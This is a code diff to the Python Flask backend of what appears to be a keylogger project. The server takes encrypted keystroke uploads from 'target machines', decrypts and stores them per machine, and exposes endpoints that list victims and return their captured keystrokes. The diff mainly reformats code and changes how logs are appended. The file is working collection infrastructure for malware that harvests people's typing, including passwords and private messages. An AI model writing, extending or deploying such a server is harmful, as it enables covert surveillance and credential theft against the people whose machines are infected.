@@ -1,5 +1,6 @@
 import os
 import sys
+
 sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
 from flask import Flask, jsonify, request, json
 from flask_cors import CORS
@@ -8,11 +9,14 @@ from KeyLoggerAgent import encryptor
 
 DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")
 
+
 def generate_log_filename():
     return "log_" + time.strftime("%Y-%m-%d") + ".txt"
 
+
 app = Flask('app')
 CORS(app)
+
 
 @app.route('/api/upload', methods=['POST'])
 def upload():
@@ -21,7 +25,7 @@ def upload():
     if not data or "machine" not in data or "data" not in data:
         return jsonify({"error": "Invalid payload"}), 400
     machine = data["machine"]
-    #log_data = data["data"]
+    # log_data = data["data"]
     log_data_decrypted = encryptor.Encryptor().decrypt(data["data"])
     print(f"Decrypted data: {log_data_decrypted}")
 
@@ -33,36 +37,21 @@ def upload():
     file_path = os.path.join(machine_folder, filename)
     timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
 
-    if os.path.exists(file_path):
-        with open(file_path, "r+", encoding="utf-8") as f:
-            file_data = json.load(f)
-            new_entry = {
-                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
-                "data": log_data_decrypted
-            }
-            file_data[time.strftime("%Y-%m-%d") + " data:"].append(new_entry)
-            f.seek(0)
-            f.write(json.dumps(file_data, ensure_ascii=False, indent=4, sort_keys=False) + "\n")
-    else:
-        with open(file_path, "w", encoding="utf-8") as f:
-            json_data = {
-                time.strftime("%Y-%m-%d") + " data:": [
-                    {
-                        "timestamp": timestamp,
-                        "data": log_data_decrypted
-                    }
-                ]
-            }
-            f.write(json.dumps(json_data, ensure_ascii=False, indent=4, sort_keys=False) + "\n")
+    with open(file_path, "a", encoding="utf-8") as f:
+        new_entry = {
+            "timestamp": timestamp,
+            "data": log_data_decrypted
+        }
+        f.write(json.dumps(new_entry, ensure_ascii=False, indent=4, sort_keys=False) + "\n")
 
     return jsonify({"status": "success", "file": file_path, "data": log_data_decrypted}), 200
-
 
 
 @app.route('/api/get_target_machines_list', methods=['GET'])
 def get_target_machines_list():
     machines = os.listdir(DATA_FOLDER)
     return jsonify({"machines": machines}), 200
+
 
 @app.route('/api/get_keystrokes', methods=['GET'])
 def get_target_machine_key_strokes():
@@ -85,10 +74,11 @@ def get_target_machine_key_strokes():
                     data.append(entry)
     return jsonify({"data": data}), 200
 
+
 @app.route('/api/decrypt_data', methods=['GET'])
 def decrypt_data():
-
     return jsonify({"status": "success"}), 200
 
+
 if __name__ == '__main__':
- app.run(debug=True)
+    app.run(debug=True)
